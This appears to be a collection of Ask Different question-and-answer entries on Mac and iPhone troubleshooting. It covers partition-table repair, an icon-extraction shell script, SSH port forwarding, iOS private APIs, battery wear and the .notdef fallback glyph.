which is 878,658,168 sectors at 512 bytes per sector.\n\nIn your question, you stated you entered the commands shown below. This was the wrong solution. The results, from entering these commands, caused you to incorrectly believe disk0s2 was APFS formatted.\ngpt remove -i 2 disk0\ngpt add -i 2 -b 409640 -s 878658168 -t 7C3457EF-0000-11AA-AA11-00306543ECAC disk0\n\nAccording to klanomath's answer, you should have entered the commands given below.\ngpt remove -i 2 disk0\ngpt add -i 2 -b 409640 -s 878658168 -t 53746F72-6167-11AA-AA11-00306543ECAC disk0\n\nAccording to Wikipedia, Core Storage was introduced by Apple to Mac OS X Lion. So there is a chance making the correction will allow the volume you desire to mount. I do not think making the correction will allow you to boot High Sierra. I state this because disk0s3 appears to have the wrong partition type stored in the GPT.\n\nNote: You will not be able to use the gpt command to make the correction while booted to Lion. You could use either boot the Mac as you did when entering the incorrect correction or the macOS Recovery that Tetsujin requested.\n\nUpdate 1\nEvidentially, when the OP entered the incorrect correction, there were no volumes that automatically mounted on the drive with the identifier disk0. However, since then the OP has installed Lion, which created a new volume that automatically mounts on the partition with the identifier disk0s4. Therefore, the commands to enter would be the following.\ndiskutil unmountdisk disk0\ngpt remove -i 2 disk0\ndiskutil unmountdisk disk0\ngpt add -i 2 -b 409640 -s 878658168 -t 53746F72-6167-11AA-AA11-00306543ECAC disk0\n\n\nNote: The diskutil unmountdisk disk0 command has be repeated because disk0s4 will be automatically mounted after the gpt remove -i 2 disk0 command completes.\n\n", "Q: How to recursively extract custom icons from subfolders and save them in image files I am migrating from MacOS to Linux.\nI have customized the icon of many of my sub-folders in my \"Documents\" folder.\nI learned how to do the same in Linux, using image files, and now I would like to transport all my custom icons to my new system.\nSince the number is quite high, I would like to automate this process: recursively copy the custom icon of all the subfolders, and save each of them in a separate image file (.png format?).\nMaybe this could be done with an Automator script, but I am not proficient with that.\n\nA: The example shell script code, shown below, what tested under macOS Catalina saved as a shell script and executed in Terminal.\nIt makes use of the the third-party utility fileicon, which is a shell script that use all native macOS functionality to extract the icons from the folders that have a custom icon. I used the manual installation instructions on the linked web page.\nThe example shell script code creates a working folder within the Documents folder with the naming convention of, e.g., Documents Folders Images - 1632963703 where e.g. 1632963703 is the seconds since epoch. Within this folder, a hierarchical folder structure is created in the qualified pathname for each folder from the Documents folder, that has a custom icon, where an .icns file  is created as the extracted image and a .png file created from it. The files/folders are named according the name of the folder with the custom icon. This way you have no problem knowing where they go once moved to Linux.\nTo use the example shell script code, in Terminal, run the following compound command:\nf='extracticons'; touch \"$f\"; open -e \"$f\"; chmod +x \"$f\"\n\nCopy and paste the example shell script code, shown below, into the opened extracticons document, then save it.\nYou should then move the extracticons shell script to a directory located within the shell's PATH.\nI moved it to /usr/local/bin, e.g,:\nsudo mv -v extracticons /usr/local/bin/\n\nNow it's ready for use, just type extracticons and press enter.\n\nExample shell script code:\n#!/bin/zsh\n\ndoc_dir=\"$HOME/Documents\"\nicns_dir=\"${doc_dir}/Documents Folders Images - $(date +%s)\"\n\nwhile IFS= read -r line; do\n    [[ \"${line}\" =~ ($HOME/)(Documents/.*)(/Icon) ]] || continue\n    mkdir -p \"${icns_dir}/${match[2]}\"\n    cd \"${icns_dir}/${match[2]}\" || exit\n    printf '%s\\n' 'Creating .icns file...'\n    fileicon get \"${match[1]}${match[2]}\"\ndone < <(find \"${doc_dir}\" -type f -name 'Icon?' -print)\n\nwhile IFS= read -r line; do\n    dir_path=\"${line%/*}\"\n    file_name=\"${line##*/}\"\n    cd \"${dir_path}\" || exit\n    printf '%s\\n' 'Creating .png file...'\n    sips -s format png \"${file_name}\" --out \"${file_name%.*}.png\"\ndone < <(find \"${icns_dir}\" -type f -name '*.icns' -print)\n\ncd \"${icns_dir}\" || exit\nprintf '%s\\n' 'Creating Zip Archive...'\nzip -r 'DocumentsFoldersIcons.zip' 'Documents'\nprintf '%s\\n' \"Deleting ${icns_dir}/Documents\"\nrm -r \"${icns_dir}/Documents\"\n\n\nNotes:\nThe last block of code in the example shell script code creates a zip archive file of the hierarchical folder structure and then cleans up by deleting the hierarchical folder structure, leaving a file named DocumentsFoldersIcons.zip containing all of the icons created with their paths recursed. You can always comment it out or remove the rm command if you want.\nThis answer only covers the extraction of custom icons and the creation of a .png file from the .icns file. Assigning the icons to folders under Linux is outside the scope of appropriate questions for Ask Different. Posting a question at Ask Ubuntu or Super User would be more appropriate for the Linux side of things.\nOn a side note though, once you have extracted the DocumentsFoldersIcons.zip files on the Linux system, if you need different sizes of the image other than the one extracted by sips, you can use icns2png to extract all the icons in the .icns files to the various sizes within by doing the following in a Terminal:\ncd '/path/to/extracted/Documents'\nfind . -type f -name '*.icns' -execdir sh -c 'icns2png -x \"$1\"' sh {} \\;\n\nNote that this assumes icns2png has been installed.\nThen in each folder you will find, e.g.,:\nFoldername.icns\nFoldername.png\nFoldername_16x16x32.png\nFoldername_32x32x32.png\nFoldername_48x48x32.png\nFoldername_128x128x32.png\nFoldername_256x256x32.png\nFoldername_512x512x32.png\n\nThe example shell script code was tested in Terminal under macOS Catalina with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\n\n\n\nThe example shell script code is just that, an example, and sans any included error handling does not contain any additional error handling as may be appropriate, needed, or wanted. The onus in upon the user to ensure the script if fit for use for ones purpose.\n", "Q: Terminal command to \"unplug\" and replug external monitor I'm using an old Apple 30\" Cinema Display via a series of dongles:\n\nApple Silicon M1 Mac connecting 30\" Apple Cinema Display\n\nThe native resolution is 2560 x 1600 and works great.\nIt may require to holding Option when clicking \"Scaled\" to get that resolution.\nOccasionally, after awaking from sleep, the monitor awakens in an ugly pixelated low resolution state. System Preferences shows 1280 x 800 as the max resolution.\nAt this point I unplug/replug the USB-C cable. The monitor goes back to native resolution after it reconnects.\nI want to avoid digging behind my desk to unplug the USB-C / Thunderbolt cable.\nIs there a Terminal command I can run to quickly \"reconnect\" all external displays?\nI'm not interested in anything that would require me to shut down the Mac, reset the NVRAM, etc. What I want is a quick software alternative to manually unplugging the monitor.\n\n\nA: Originally answered here -- This can be done by using uhubctl, which allows you to toggle and cycle power on individual ports for supported USB hubs.\nYou can use homebrew to install it as follows:\nbrew tap mvp/uhubctl https://github.com/mvp/uhubctl  \nbrew install uhubctl\n\n\nA: Have you tried holding down the option key while selecting \"scaled\"? This should give you a bigger list of options, which may include the one you want. Even if it does not, switching resolutions might be enough of a reset.\nIf neither of those work, you might try adding an EDID emulator to your dongle chain, giving your monitor a more reliable EDID.\n", "Q: iPhone 8: I don't have a passcode, can no longer open phone I got a refurbished iPhone 8 and was using it for a few days with just my thumbprint on the Home button, ie, Touch ID. Last night I downloaded Outlook and WhatsApp. This morning, I got the script: \"Touch ID requires your passcode when iPhone restarts.\"\nI never chose or wanted a passcode, knew nothing about this. I did not forget it, I just never was asked to create a passcode when I unboxed and started up my phone. Now I cannot get into Settings. Or anything.  I tried 00 then 000 as possible security codes, then quit after that, thinking I might be permanently locked out after a third try.\nDoes anyone know when I may have inadvertently created a passcode in the start-up process? What do I do now? return the phone?\nI have read that the Security passcode is linked to my SIM card. I contacted my service provider, RedPocket Mobile, and they said I should contact a technician because password problems are not their bailiwick.\nP.S. Oddly enough, I can use the phone when it is connected to the Bluetooth in my car. I can make and receive calls and check voice mail, in my car only, as of today.\n\nA: The pass code for your phone is the user's own code for accessing their own private data stored on the phone. It is typically 6 digits (4 digits on earlier systems) - but it might also be alphanumerical, if the user choose so. You typically enter it from the Lock Screen in order to access the Home Screen (the one with the icons for all your apps). The user is required to enter it for example after powering the phone up, and periodically when using FaceID or TouchID.\nThe pass code has nothing to do with your SIM-card or your service provider. It is a pass code selected by the user and only recorded on the device - used for protecting the rest of your data. The SIM-card instead is protected by a PIN.\nEntering the pass code incorrectly will not block all access after 3 incorrect attempts - you must be thinking of the SIM PIN there. If you enter the pass code wrong, you'll be temporarily delayed - i.e. some time will need to pass before you can have another attempt. If you keep entering the pass code incorrectly, the delay will become larger and larger each time. It is possible to set the phone up to erase all data after 10 incorrect attempts.\nYou cannot enable TouchID without setting a pass code. It is part of the setup process, and although it is possible to skip setting a pass code, you cannot skip the pass code AND enable TouchID. It is simply not possible.\nSo what happened is that you either set a pass code and forgot about it, or the pass code was set by the vendor before you got the phone - and the vendor helped you setup TouchID. The latter would be very unusual.\nIn either case, I would recommend that you erase your phone and start over with a pass code, you can remember. You can erase your phone and restore the phone's functionality by following Apple's instructions:\nhttps://support.apple.com/en-us/HT204306\nIn short form, the instructions tells you to:\n\n*\n\n*Turn off the phone\n\n\n*Press and hold the side button on the phone\n\n\n*Immediately connect the phone to your computer (keep holding the button)\n\n\n*When you see the Recovery Mode screen on the phone, you can let go of the side button\n\n\n*Locate the phone in Finder on your Mac and choose to \"Restore\" it.\nNote that this process erases all data you might have had on the phone. You can choose to restore from backups afterwards if you have backups.\n", "Q: Cannot remove GT8P3H7SPW.com.mcafee.CMF.networkextension service from launchd ref: Consent needed to enable ENSM Firewall 10.7.5 and later\nThis system extension was left over from a McAfee LiveSafe install that I had removed using the provided uninstaller.\nI had to disable it from Network Settings to prevent the hard crashing that began to occur after installing another antivirus product.

I am met with \"ssh: connect to host xxx.xxx.x.xx port 22: Network is unreachable\". I have remote login turned on on the machine I am trying to get into. Any help is appreciated. Thanks!\n\nA: Different network services use different default \"ports\" to send information. Web pages use port 80, ssh uses port 22. Most likely your issue is caused by your router blocking port 22 access from outside networks.\nTo fix this you need to go to the port forwarding (not the firewall) configuration page for your router and add a rule which defines the relationship between your internal (home) network and the external (the Internet) network. Below is an example of port forwarding from my router.\n\nThe Name(User) value does not matter, it is an internal reference only.\nThe important things are the:\n\n*\n\n*LAN IP, that will be the internal address of the computer you are trying to SSH to.\n\n*External port, this the port the router will open to let you connect ... it does not have to be port 22.\n\n*Internal port, this is port on your computer ... it does not have to be port 22, but if do not use port 22 though you will need change it to something else in sshd.config in /etc/ssh or have software that does it for you (I am using Screens).\n\nThis page is from an ipTime router. Your router will probably be different, but the port forwarding page will have the same options. Once you have set up port forwarding, follow the instructions for saving configuration changes for your brand of router.\nBefore you close your router configuration webpage there is one more thing to do!\nFind the WAN IP address. It may or may not go by a different name on your router, but you will know this IP when you see it because it is the public IP address assigned to your router by your internet provider. You need this IP address to SSH to your computer from anywhere outside your home network.\nSo instead of using ssh travisknoche@192.168.0.11 you will use this: ssh username@Public-IP-address.\n", "Q: What happens to Hide My Email emails if you cancel iCloud+? I've started using the new Hide My Email feature in iCloud+. Though I've thought about canceling my iCloud+ subscription. Apple's website says the following: \"If you downgrade to the free iCloud plan, ... you will no longer have access to iCloud+ features like Hide My Email, Private Relay, and HomeKit Secure Video support\".\nIf I already have Hide My Email email addresses made, will I stop receiving emails from those email addresses if I cancel my iCloud+ account?\n\nA: Hide my email is essentially a email forwarding service. If you cancel iCloud+ it is likely these \"Hide My Email\" addresses will stop working. Even if this doesn't happen immediately you still run the risk that they will be silently disabled at some point in the future without your knowledge and you will lose emails that would have been received.\nIf you are prepared to accept the risk of this happening then you could carry out a test by signing up for a free trial account of iCloud+ and then cancelling or letting it expire to test what happens.\n", "Q: iOS Private APIs I am interested in some of the technical details behind Apple's private APIs in iOS. I can't seem to find a good writeup on some of these details (beyond how to call the private API functions), though it would be great if someone could post a link if a writeup does exist.\nSpecifically, I have a few random questions:\n\n*\n\n*Why doesn't Apple just strip out the private API symbols from their libraries so that third-party apps cannot access them? Is this because functions from the public API call the functions from the private API directly?\n\n\n*This link mentions that Uber allegedly used a private API (IOKit) to access device serial numbers from their app. Why did their app have access to this information in the first place, even if they called a private userspace function? Did the private function in IOKit in turn read the serial number from an undocumented and unprotected syscall (or some other interaction with the kernel)?\n\n\n*I read that Apple scans for accesses to private APIs during their App Review Process, but wouldn't this automated scanning be fairly trivial to defeat? Does Apple have any hope of ever solving the \"problem\" of private API accesses from third-party apps?\n\nA: *\n\n*Apple's own apps using the private API wouldn't be able to use them, either, if the symbols were stripped out. After all, the dynamic linker doesn't know about \"private\" or \"public\" API. It's not like symbols are individually marked; it's just that headers/documentation for \"public\" API are published.\n\n\n*There are several repositories with generated headers for all symbols of Apple frameworks. Look for \"iOS runtime headers\", \"macOS runtime headers\", and similar search terms. In the case of IOKit, the frameworks is public on macOS but considered private on iOS. Usually, frameworks shared between different Apple OS's are mostly the same (there are exceptions, like Keychain and Security APIs; but they're not vastly different). I don't know the details how Uber was using IOKit or which info it was able to extract, but I guess they were able to extract the MAC addresses of network interfaces with it, which Apple tried to prevent in other APIs. We (developers) were using the MAC addresses to identify a specific device and when Apple tried to prevent this a lot of us were looking into ways to still get it (or a similar device-unique identifier) because Apple's more privacy-minded approach interfered with the wish of companies to be able to get this info. Think device-bound licenses, but also marketing.\n\n\n*Apple's screening for private API use isn't perfect and there are several ways developers can gain access to private APIs without Apple noticing, as long as there's not a real (file/IPC) permission problem preventing access. Because of obfuscation, the dynamic nature of Objective-C, and how the dynamic linker works, Apple is having a very hard time catching all private API use if a developer is intentionally doing (and hiding) it. Their screening mostly catches obvious use. One of the reasons is that some private API might get called by public Apple APIs, so detecting whether calling a private API was done by the developer directly, or whether it happened indirectly through public APIs, is not easy. I doubt they will ever solve this and I also doubt it's worth investing a lot of resources into this problem.\n\nA: In to have the right context for the more specific answers to your question, it is important to understand what the purpose of \"private APIs\" really are:\nTo understand it we must know what an API (Application Programming Interface) is: An API is something that allows the developer of applications to invoke functionality implemented by someone else. Historically, you had system programmers creating operating system and system libraries, and you had application programmers creating the application that end-users would use. The link between them would be the API.\nToday, APIs exists in many different forms that serves different purposes:\n\n*\n\n*Operating System APIs: For example the use of \"system calls\" that allow non-operating system programmers (i.e. user-space programs) to invoke functionality within the operating system kernel. On most common operating systems this is also a security boundary (i.e. this is the place where checks and controls are in place to ensure that only permissible functionality is invoked)\n\n\n*System Library/Framework APIs: For example the system vendor supplies a framework for creating user interfaces so that the whole system can have a set of recognizable widgets (such as buttons, lists, etc) that are drawn the same way across applications. There's usually no security boundary here.\n\n\n*Application Internal APIs: Some applications are internally divided into libraries/frameworks and feature their own APIs. It might be for example an application developed by multiple teams that divide up their areas of responsibility through libraries/frameworks - or it might be that a library is created once and used for many different applications while the developer wishes that code to remain separated for the sake of maintainability. The library might be in-house developed or it could be an open-source library shared by thousands. There's usually no security boundary here.\n\n\n*Network / Web APIs: Some systems expose APIs through networks, or more specifically through the web. For example Amazon exposes an API that allows developers to send a photo from their app to Amazon's servers, and receive an OCR'ed version back (i.e. text extracted from the photo). There's usually a security boundary here, as these web APIs commonly require some form of authentication to ensure payment or protect private information.\nNow that we have the basics of APIs down, next up is what a \"private API\" then means:\nIn fact, Apple doesn't refer to \"private APIs\" as such. Instead they publish developer documentation that includes API references and header files, and they then recommend that developers only use those publicly documented APIs. So called \"private APIs\" are what Apple actually calls \"non-public APIs\".\nIt is not an Apple invention, but rather private/publics APIs have been used in the industry for decades. For example historically Microsoft would publish extensive developer documentation on how to use their Windows USER API for creating graphical user interface with various controls, but their Office product would have private controls that were only available in Office even though they existed in a API that third-party developers technically could have used.\nAnd now we come to the purpose of \"private APIs\":\nTraditionally public APIs comes with a (sometimes implied, sometimes explicit) promise that these APIs would not disappear or change underneath application developers for a long time. A developer could use a public API and expect it to perform as documented - and to keep doing that when the vendor released minor and major updates. Usually the developer could also expect to get a warning (a so called deprecation notice) when the public API they were using would change or go away in the following years. Similarly developers would expect to be able to report bugs in these APIs to the vendor.\nPrivate APIs on the other hand did not enjoy these niceties. A private API could disappear in a system update, their could suddenly start working differently (or not at all) - and developers would not be able to complain to the vendor about bugs or missing features.\nThis is also how public/private APIs worked on the iPhone in the beginning. The reason that many think of iOS when you mention \"private APIs\" is that Apple later introduced a new requirement for publishing an app on their App Store - namely that the app should only use public APIs. This way Apple is more able to ensure themselves that an app that worked last year would keep working next year for the customers that bought them from the App Store.\nYou might assume that the distinction between \"public\" and \"private\" APIs to have something to do with system security. That's almost never the case. In many cases APIs are in the form of executable located in a library/framework file on the system. There's nothing technically hindering the developer from just copying code from the \"private\" library into their own application making it part of their application and thus no longer an API. Depending on how much code is copied, the developer would be infringing on copy rights and possibly a license agreement between them and the vendor.\nIn reality, private APIs are often made private because they're still changing. For example Apple might have a private API for a new piece of hardware or a new set of functionality on their device. With each release that API changes a bit as Apple developers learn from mistakes and discover the way user's interact with their own apps that use these functionalities. Later when the API has stopped changing (as much), Apple makes that same API public as now they think it is ready for consumption by third party developers.\nNow we get to your more specific questions:\n\n*\n\n*Part of the reason Apple (and other vendors) do not strip out the\nprivate API symbols from their libraries is mainly that then they\nthemselves, or partners they have allowed to use private APIs, also\nwould not be able to readily use such these APIs in their apps.\nApple would then have to duplicate all libraries - having a version\nfor themselves and another for non-partners, and ensure that the\nright version was made available in each case.\nA more logical way for Apple to restrict the use of private APIs\nwould be to change the dynamic linker and the messaging system\nbetween objects used in Objective-C and Swift to ensure that\nnon-entitled apps would be blocked from calling private APIs.\nHowever in addition to adding lots of really unnecessary complexity - it would come with a non-trivial performance penalty.\nIn actual fact, Apple is probably not that concerned about a\ndeveloper using a private API - and thus they stick to simply having\na guideline, trying to detect the most obvious uses to educate\ndevelopers, and then only do something about it should it become\npublicly known that a private API has been used.\nIn almost every case, the use of a private API could have been\nreplaced by the app developer by simply copying the executable code\nfrom the library into their own app - thus making the whole point of\ncontention moot. The reason developers use private APIs is often to\naccess functionality that Apple built that they do not have the time\nto recreate themselves, or to access functionality that they expect\nwill be public anyways soon. It then becomes the responsibility of\nthe developer to ensure that they only use that private API for\ncertain versions of the system that actually has that private API -\nand they would endure a risk of their app breaking with system\nupdates.\n\n\n*Regarding the Uber case: The real problem here is actually not the use of private APIs. It is actually a security bug in the operating system that private information was exposed to the app. The app developer could just have done the same thing in their code as the private API did and they could have gotten access to the same private information. That is not good.\n\n\n*Yes, automated scanning is a \"cat and mouse\" game - where it is usually much easier for the app developer to make something that obfuscates their use of private APIs, and much harder for Apple to build a detector for. I don't think the use of private APIs really is that much of a \"problem\" for Apple.\n", "Q: How to clear dozens of iPhone Software Update notifications popups Due to a lightning cable connection problem there are dozens of messages on my Macbook Pro.

What circuit needs to be replaced for an overvoltage burnout? My wife ordered a new adapter for her 2013 Mac Air Model A1466, Amazon sent the wrong one and we did not notice because the mag fit perfectly and it appeared to charge. This seemed to charge fine for a couple weeks, but last night it went totally dead.  When I press the power button, there is absolutely no reaction--it does not matter whether it is plugged in or not.\nWhen first connecting the charger, it appears green for a few seconds and then orange and never goes back to green no matter how long it's plugged in (13 hours charging overnight and no response when pressing the ON button).\nWhen examining things this morning, I discovered that the Mac Air is rated for \"14.85V 3.05A Max\" and the Charger's output is rated at 20V 4.25A.  I understand that an overpowered amperage is fine--no problem--the device will take what it needs: But overpowered voltage is critical and will fry your device!\nMy question is . . . what protective mechanism or circuit does Apple use to prevent the motherboard from being fried?  Do you have a diagram or name of the replacement part? Any description where it is located would be helpful as I looked and could not readily recognize the circuit inside. Thanks in advance.\n\nA: It does not to me seem evident that that any \"overvoltage burnout\" occurred at all.\nThe MagSafe 2 connector is a 5 pin connector, where the center pin is used to establish a data connection between the computer and the charger. Through this connection, the computer tells the charger what kind of wattage it needs. Your MacBook Air would request 45W. The charger then applies the voltage suitable for a MacBook Air (14.5V).\nThe MagSafe 2 chargers comes in various variants that include the voltages 14.5V, 16.5V, 18.5V and 20V. As described, the computer and power supply negotiate the correct voltage before applying a load.\nAs described in Apple's support pages, you can connect a higher wattage (and thus voltage) charger to a smaller Mac model without any issues (i.e. for example a 85W 20V charger for a 15\" Retina MacBook Pro connected to a 45W-rated MacBook Air).\n", "Q: Where does iCloud saves backups and documents?

Compare that with your SMTP (incoming mail) server, which does include the intermediates:\n$ openssl s_client -connect mail.piraneo-canepa.ch:smtp -starttls smtp </dev/null\nCONNECTED(00000005)\ndepth=2 C = US, O = Internet Security Research Group, CN = ISRG Root X1\nverify error:num=20:unable to get local issuer certificate\n---\nCertificate chain\n 0 s:/CN=piraneo-canepa.ch\n   i:/C=US/O=Let's Encrypt/CN=R3\n 1 s:/C=US/O=Let's Encrypt/CN=R3\n   i:/C=US/O=Internet Security Research Group/CN=ISRG Root X1\n 2 s:/C=US/O=Internet Security Research Group/CN=ISRG Root X1\n   i:/O=Digital Signature Trust Co./CN=DST Root CA X3\n---\n[...]\n\nHere the \"Certificate chain\" section includes two intermediates along with the server's leaf cert. If you add the -showcerts option, it'll print all three certs (in PEM format).\n...so I think all you need to do is add those same intermediates to the TLS config on your IMAP server.\n", "Q: What software is this? After the start of the pandemic people have been using increasingly nicer software when giving talks on Zoom.  Among the nicest ones I've seen is one in which a PDF file is presented while the speaker scribbles on top of it or highlights parts of the text, the highlighting slowly disappearing as the speaker moves further down the page.

Tl;dr\nMy 2015 Macbook Pro Retina shuts off without any warning when the battery discharges to 75%.\nAccording to Coconut Battery\nDesign Capacity: 56.7%\nMade in 4/13/15\nHas lasted 3,268 cycles, and the battery status is apparently 'Fair'. Simplo made my battery.\nmacOS Mojave Experience\nI've recently started to notice a decline in my battery when I decided it would be a 'good' idea to upgrade to Mojave. Long story short: it wasn't. I have 2 desktops with dynamic wallpaper (changes throughout the day), and most of the time I leave my Mac asleep (8 hours~) to reopen it, the trackpad is hard: Macbook is dead.\nmacOS High Sierra Experience\nOn HS(10.13.6), the battery used to die at around 30-40%, which to me isn't as bad. When I opened it after it's 8 hour break, it shows me the login screen (takes a couple 4-5 seconds to wake up). Note that on Mojave, if it did survive the 8 hour nap then it woke up immediately; and I store my Mac in a cool place, the bottom feels slightly warm. Power nap is off for both situations.\nBattery Issues\nRecharging boots it up and shows me anywhere from 64% to 75% battery left. I've also noticed a bunch of battery glitches in the top menu, and whenever I charge it'll show me 45% then quickly switch to the 'real' percentage.\nBefore someone tells me to 'reset your SMC', I will point this out: System Report > Controller returns that there is no controller. I have tried resetting the SMC twice and it did reset (indicated by power adapter turning green then orange) but had no effect on the battery.\nI'm not sure about getting a new battery, as I may be getting another Macbook later this year, so blowing $100 on a new battery for a 6 year computer I may not use for a long time is not a financially smart decision.\nI have also forgot to mention this, but when my Mac reaches 100%, Coconut Battery says it can still be charged, and it actually can. When I \"overcharge\" it at 100%, turn off the charger it takes significantly longer to get from 100% to 99% if I were to just stop charging directly when 100% is reached.\nSo, what can I do so my Mac dies at 56% instead of 70%~?\n\nA: There is a Battery Recall Program for some MacBook Pro 15\" Mid 2015.\nYou can check if your device is eligible on https://support.apple.com/15-inch-macbook-pro-battery-recall\n\nA: Distinguish your battery cells actually holding that amount of charge from the battery controller IC's estimate of charge, which appears to be off.  Due to the very flat discharge curve of LIon cells, charge is estimated by measuring the charge flowing into and out of the battery, and estimated charge capacity will be updated over time as well.  The controller may have failed to properly track charge, or to update its estimated charge capacity as quickly as it has degraded,  OR the battery may be self-discharging.\nSuggested:  feel the battery, especially just before and after charging, and perhaps 15..30 minutes in.  Is it hot?  If so, I will suggest treating this as a potential safety or equipment damage issue.\nYour battery cells are worn out and need to be replaced.\nWhen ordering a replacement battery, beware battery packs that were manufactured around the same time as the original.\nAlso beware \"jump-started\" LIon batteries.  I've seen the aftermath of that.  Once an individual cell discharges below (IIRC) 1.4V, the copper anodes start to go into solution.  The battery controller thus disables the battery pack -- but this can sometimes be reversed by \"jump-starting\" the pack.  Charge them up:  copper plates out as nucleation sites, then lithium whiskers begin growing whenever the battery is charged.  Eventually, they may puncture the cell membrane and you can have a battery fire.\n\nA: Typical life expectancy (\"Maximum cycle count\") is 1,000 cycles. From Apple's webpages: \"Your battery is designed to retain up to 80% of its original charge capacity at its maximum cycle count. For best performance, replace your battery when you reach its maximum cycle count.\"\nIn short: your battery has been heavily used and needs replacing. I'm surprised that the OS hasn't given you a notice that the battery needs servicing. It just isn't reliably holding charge.\nApple defines one cycle as a complete 100% - 0% discharge; and this also includes partial discharges cumulatively, so a discharge to 75% (before recharging) is 0.25 towards the next cycle.\nIf the data is to be believed, in six years, you've managed an impressive average of a complete discharge from 100%, then a recharge and another 50% discharge, every day.\nThere's nothing else that can be done to improve it.\n", "Q: Volume control not shown in menu bar even though enabled in Preferences The volume control is enabled in Settings | Sound Effects\n\nbut it is not actually showing ?\n\nIs there some other setting required?\n\nA: I tried the non scientific method: disabling and re-enabling the show volume in menu bar .. and that worked.\n", "Q: How to remove Microsoft AutoUpdate from macOS? I tried Microsoft Edge, but It installed \"Microsoft AutoUpdate\" app. Its very annoying that Microsoft installs crap I didn't want on my machine.\nI tried to look for the Application but no luck. \n\nA: I finally managed to find the Microsoft AutoUpdate.\nYou need to go to /Library directory, at the root of your HD, and search \"Microsoft autoupdate\" on that location (which finds /Library/Application Support/Microsoft/MAU2.0/Microsoft AutoUpdate.app on my system.\nThen just move it to the trash.\n\n\nA: To clean uninstall it:\n\n*\n\n*Install the great free and small app\nAppCleaner\n\n*Open Finder, press Cmd Shift G, and paste /Library/Application Support/Microsoft/MAU2.0/\n\n*You will find \"Microsoft AutoUpdate.app\", drag it to AppCleaner\n\n*Click Remove\n\nThere may be some unchecked boxes I suggest to not check (because they may relate to other Microsoft apps).\nFor more experienced users, visit these three locations using Finder's Cmd Shift G shortcut:\n\n*\n\n*/Library/LaunchAgents, drag com.microsoft.update.agent.plist to the\nTrash\n\n*/Library/LaunchDaemons, drag com.microsoft.autoupdate.helper.plist to the Trash\n\n*/Library/PrivilegedHelperTools, drag\ncom.microsoft.autoupdate.helper.plist to the Trash\n\n", "Q: How to delete unused apps like Stocks.app and Grapher.app from Mojave There are some apps that come with the OS on a Mac and which I've never used even once in years. Apps like \"Grapher\" or \"Stocks\".\nNow my disk is almost full and I'm trying to remove these unused apps to free up a bit of space, but no matter what I try I am unable to uninstall them. When I drag the Stocks app to the trash, for example, the operation is refused and I get a message saying\n\n“Stocks.app” can’t be modified or deleted because it’s required by\nmacOS.\n\nThe same is true for Grapher.app, Books.app and others.\nNow why would a stock app be required be the OS?

MacOS \"overlays\" the things from the read-only partition into your directory tree (as seen from Finder; from the shell or apps point-of-view, it's clearly divided).\nApple-provided apps are on the read-only partition. So even though they appear in /Applications in Finder (and some apps), in reality, they're in /System/Applications. Deleting them would require you to remount the read-only partition (which you can only do in Recovery Mode, as far as I know). But even then, it wouldn't help you with your space problem as the size of the read-only partition does not change, thus you would not get any additional free space on your main partition by deleting the system-provided apps.\n\nA: As @nohillside mentioned those apps don't really use a lot of space, may I instead suggest two options :\n\n*\n\n*Use \"cleaning apps\" like.

Sometimes, MacOS will display a question mark in a square when a glyph can't be found in a font for a character:\n\nThis isn't the glyph of the Unicode replacement character (�), which has a different orientation for the square and inverted color scheme (white question mark on black, rather than black q.m. on white). What's the official name for this glyph, if it has one?\n\nA: Fonts can include a character called .notdef, which will be displayed when any glyph not defined in the font is requested. It is entirely up to the font designer what shape this glyph is.\nMicrosoft's OpenType guidelines say:\nIt is recommended that the shape of the .notdef glyph be either an empty rectangle, a rectangle with a question mark inside of it, or a rectangle with an “X”.\nhttps://docs.microsoft.com/en-us/typography/opentype/otspec170/recom#shape-of-notdef-glyph\nSan Francisco, however, uses six horizontal lines.\n.\n\n.\nSo, it has a name based on its use as the .notdef glyph, whatever shape it is, but that particular symbol doesn't have its own name independently. (Ahhhh.)\n\nA: I see no mention of this I’m the macOS user guide, emoji or font section of help, and neither in the Apple Style Guide nor in the Typography section of the macOS Human Interface Guidelines.\nThe closest document covering the requirements for developers to use the missing character glyph is in the TrueTyoe Reference.\n\n*\n\n*https://developer.apple.com/fonts/TrueType-Reference-Manual/RM07/appendixB.html\nIf there is an official name for this, where it’s documented escapes me as well.\n\nA: One unofficial name for this glyph is 'Tofu', says Wikipedia:\n\nWhen text is rendered by a computer, sometimes that text will contain a character that cannot be displayed, because no font that contains it is installed on the computer. When this happens, a substitute character (typically a small rectangle) is shown to represent it. Those small rectangles have sometimes been called by the slang name tofu because of their visual similarity to the food of the same name.\nGoogle's aim for Noto (whose name is derived from no more tofu) is to remove this kind of 'tofu' from the Web.\n\nThe official naming for this is indeed '.notdef':\n\nWhat gets drawn as .notdef glyph is for the font’s designer to figure out. Even within the rectangle convention, the sizes will vary—and some type designers take their rectangles and cross them out, or adorn with question marks:\n\n\n— Marcin Wichary, Designer/Typographer: \"When fonts fall\", September 29, 2020.\n\nLooking at the last picture above is confirmed when examining the LastResort font itself. Under \"Glyph Name\" is says \"lastresorttemplate\" (260) — the actual '.notdef' name (256) given to the same glyph without the question mark.\n\n\nIt’s one missing character to rule them all, a nicely balanced question mark inside a rounded rectangle. It being last in the chain means it will be shown for every missing character, regardless of the font you wanted, ignoring its designer’s .notdef wishes.\nMaking sure even the tofu looks consistent is a very Apple thing to do, but their way also shows us an opportunity.\n\nSo to spell it out: the glyph in question is a '.notdef' version, but for most applications not the '.notdef' from any particular font, as usually intended, but is overridden by a the '.notdef' respresentation from special font called '.LastResort' built into the OS (at ). That glyph has then the internal 'glyph name' \"lastresorttemplate\".\n", "Q: Moving photo and music libraries to external disk to free up disk space on a Mac desktop I'm using a 2011 iMac using macOS Sierra 10.12.6.

After moving it, when you open Photos/iPhoto, you may be asked to select your library.\nThis process can be repeated in the same fashion for Music/iTunes, except that it will be located in ~/Music instead of ~/Pictures.\nTwo things to note:\n\n*\n\n*If you use iCloud Photo Library, follow the same steps. After completing the steps, you can open Photos > Preferences and make sure that the library is marked as the System Library.\n\n*If, for any of these applications, not all of your media is located within the library, it will not transfer.\n\n*\n\n*In Music, you can choose File > Library > Organize Library and indicate both options.\n\n*In Photos, you can create a Smart Library that matches \"Photo is Referenced\" to see if you have any photos of this nature.\n\n\n\n", "Q: iCloud - Check the storage used by Notes?

